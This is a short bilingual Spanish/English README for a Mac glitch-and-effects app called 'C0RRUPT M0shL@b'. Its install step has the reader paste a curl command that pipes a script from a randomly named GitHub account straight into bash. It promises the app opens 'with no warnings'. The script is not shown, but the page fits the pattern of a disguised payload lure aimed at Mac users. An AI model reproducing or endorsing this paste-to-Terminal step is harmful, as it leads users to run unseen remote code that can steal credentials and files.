# C0RRUPT M0shL@b

Estudio de glitch y efectos para fotos y video en la Mac: datamosh, VHS, 3D, texto animado, quitar fondo con IA… y exportas MP4, GIF o PNG listos para reels.

## Instalar (Mac con chip Apple: M1 o más nuevo)
1. Abre **Terminal** (⌘ espacio, escribe "Terminal", Enter).
2. Pega esta línea y da Enter:

```
curl -fsSL https://github.com/njhmyp8qsr-cmd/moshlab-descarga/releases/download/ultima/instalar.sh | bash
```

Se baja, se instala en Aplicaciones y se abre sola, sin avisos. Para actualizar después, escribe `moshlab-actualizar` en Terminal.

---

**Install (Apple silicon Mac):** open Terminal, paste the line above and press Enter. It downloads, installs and opens the app with no warnings. To update later: `moshlab-actualizar`.
